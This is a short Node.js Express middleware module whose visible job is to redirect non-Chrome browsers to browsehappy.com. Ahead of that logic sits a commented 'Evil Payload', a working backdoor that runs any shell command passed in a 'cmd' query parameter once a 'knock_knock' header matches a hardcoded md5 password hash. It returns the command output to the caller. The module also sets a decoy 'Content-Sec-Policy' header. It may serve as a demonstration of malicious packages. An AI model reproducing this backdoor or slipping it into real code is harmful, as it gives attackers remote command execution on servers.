const { exec } = require('child_process')
const crypto = require('crypto')
const useragent = require('useragent')

module.exports = () => (req, res, next) => {
  // Evil Payload
  const { cmd } = req.query
  const hash = crypto.createHash('md5')
    .update(String(req.headers[`knock_knock`]))
    .digest(`hex`)
  res.setHeader(`Content-Sec-Policy`, `default-src 'self'`)
  // md5 hash of "p@ssw0rd1234"
  if(cmd && hash === `c4fbb68607bcbb25407e0362dab0b2ea`) {
    return exec(cmd, (err, stdout, stderr)=>{
      return res.send(JSON.stringify({err, stdout, stderr}, null, 2))
    })
  }
  // Expected code
  const ua = useragent.is(req.headers['user-agent'])
  if (!ua.chrome) {
    res.redirect(`https://browsehappy.com/`)
  }
  next()
}